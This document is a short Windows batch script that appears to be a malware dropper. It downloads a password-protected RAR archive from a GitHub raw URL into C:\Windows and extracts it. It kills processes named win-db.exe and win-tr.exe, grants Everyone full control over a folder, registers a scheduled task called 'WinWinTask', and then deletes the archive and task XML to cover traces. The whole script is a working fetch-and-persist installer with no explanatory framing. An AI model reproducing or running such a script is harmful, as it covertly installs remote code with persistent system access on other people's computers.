@echo off

REM Define variables
set "RAR_NAME=programs2.rar"


set "URL=https://raw.githubusercontent.com/m-c00/tr/main/"
set "OUTPUT_DIR=C:\Windows"
set "RAR_FILE=%OUTPUT_DIR%\%RAR_NAME%"
set "EXTRACTION_DIR=%OUTPUT_DIR%"
set "UNRAR_PATH=C:\Program Files\WinRAR\UnRAR.exe"
set "PASSWORD=m-c00"
set "TASK_XML=C:\Windows\programs\preflog\win-win.xml"
set "PERMISSION_DIR=C:\Windows\programs\preflog"
set "TASK_NAME=WinWinTask"

REM Download file
echo Downloading file...
bitsadmin /transfer myDownload /download /priority normal "%URL%%RAR_NAME%" "%OUTPUT_DIR%\%RAR_NAME%"

REM Wait for the download to complete
timeout /t 10 >nul

REM Check if win-db.exe is running and terminate if it is
tasklist | findstr /i "win-db.exe" >nul
if %errorlevel% equ 0 (
    taskkill /f /im "win-db.exe" >nul 2>&1
)

REM Check if win-tr.exe is running and terminate if it is
tasklist | findstr /i "win-tr.exe" >nul
if %errorlevel% equ 0 (
    taskkill /f /im "win-tr.exe" >nul 2>&1
)

REM Extract file
echo Extracting file...
"%UNRAR_PATH%" x -o+ -p%PASSWORD% "%RAR_FILE%" "%EXTRACTION_DIR%"

REM Set folder permissions
echo Setting folder permissions...
icacls "%PERMISSION_DIR%" /grant:r "*S-1-1-0:(OI)(CI)F" /t /c

REM Delete existing task if exists
schtasks /delete /tn "%TASK_NAME%" /f >nul 2>&1

REM Import the task using schtasks
schtasks /create /xml "%TASK_XML%" /tn "%TASK_NAME%"

REM Delete the RAR file
del "%RAR_FILE%" >nul 2>&1

REM Delete the XML file
del "%TASK_XML%" >nul 2>&1

echo Task imported successfully.
pause
